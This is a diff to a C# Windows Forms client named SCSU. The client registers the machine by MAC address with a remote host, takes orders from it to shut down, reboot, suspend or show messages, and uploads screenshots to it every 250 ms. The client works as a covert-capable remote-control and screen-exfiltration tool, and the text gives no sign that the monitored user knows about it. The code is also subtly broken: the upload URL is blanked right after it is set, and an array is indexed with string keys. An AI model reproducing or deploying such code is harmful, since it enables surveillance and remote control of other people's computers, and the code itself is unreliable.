@@ -7,11 +7,13 @@ using Newtonsoft.Json.Linq;
 using System.Drawing.Imaging;
 using System.IO;
 using System.Threading;
+using System.Net.NetworkInformation;
 
 namespace SCSU
 {
     public partial class Form1 : Form
     {
+        string captureText, settingJson, message;
         bool cmd = false;
         bool taskmgr = false;
         bool looping = true;
@@ -23,36 +25,26 @@ namespace SCSU
         }
         private void GetPicture_Tick(object sender, EventArgs e)
         {
-            string url = "https://api.myjson.com/bins/t8642";
+            string url = settingJson;
             WebClient client = new WebClient();
-            JObject setting = JObject.Parse(client.DownloadString(url));
-            if ((bool)setting["off"])
+            JArray setting = JArray.Parse(client.DownloadString(url));
+            if ((bool)setting[0])
             {
-                setting["off"] = false;
-                client.Headers.Add("Content-Type", "application/json");
-                client.UploadString(url, "PUT", setting.ToString());
-                System.Diagnostics.Process.Start("shutdown /s /t 0");
+                System.Diagnostics.Process.Start("shutdown.exe", "-s -t 0");
             }
-            if ((bool)setting["reboot"])
+            else if ((bool)setting[1])
             {
-                setting["reboot"] = false;
-                client.Headers.Add("Content-Type", "application/json");
-                client.UploadString(url, "PUT", setting.ToString());
-                System.Diagnostics.Process.Start("shutdown /r /t 0");
+                System.Diagnostics.Process.Start("shutdown.exe", "-r -t 0");
             }
-            if ((bool)setting["standby"])
+            else if ((bool)setting[2])
             {
-                setting["standby"] = false;
-                client.Headers.Add("Content-Type", "application/json");
-                client.UploadString(url, "PUT", setting.ToString());
                 Application.SetSuspendState(PowerState.Suspend, false, false);
             }
-            if ((bool)setting["havemessage"])
+            else if ((bool)setting[3])
             {
                 setting["havemessage"] = false;
-                client.Headers.Add("Content-Type", "application/json");
-                client.UploadString(url, "PUT", setting.ToString());
-                MessageBox.Show(setting["message"].ToString(),"New Message");
+                Thread thread = new Thread(new ThreadStart(showMessagebox));
+                thread.Start();
             }
             if ((bool)setting["cmd"] != cmd)
             {
@@ -120,16 +112,38 @@ namespace SCSU
                     }
                     WebClient client = new WebClient();
                     client.Headers.Add("Content-Type", "text/plain");
-                    client.UploadString("http://server.noeul.xyz:1234/api/imgJson/2/3", "PUT", base64);
+                    client.UploadString(captureText, "PUT", base64);
                 }
                 catch { }
                 System.Threading.Thread.Sleep(250);
             }
         }
+        private void showMessagebox()
+        {
+            MessageBox.Show(message,"New Message");
+        }
         private void Form1_Load(object sender, EventArgs e)
         {
-            Thread thread = new Thread(new ThreadStart(loop));
-            thread.Start();
+            WebClient client = new WebClient();
+            string mac = NetworkInterface.GetAllNetworkInterfaces()[0].GetPhysicalAddress().ToString();
+            string url = "http://2019swag.iptime.org:1234/api/macJson/" + mac;
+            string macadress = client.DownloadString(url);
+            if (macadress == "Fail")
+            {
+                GetPicture.Stop();
+                SCSUPopup popup = new SCSUPopup();
+                popup.ShowDialog();
+                Application.Restart();
+            }
+            else
+            {
+                string[] toUrl = macadress.Split(';');
+                captureText = toUrl[0];
+                settingJson = toUrl[1];
+                captureText = "";
+                Thread thread = new Thread(new ThreadStart(loop));
+                thread.Start();
+            }
         }
     }
 }
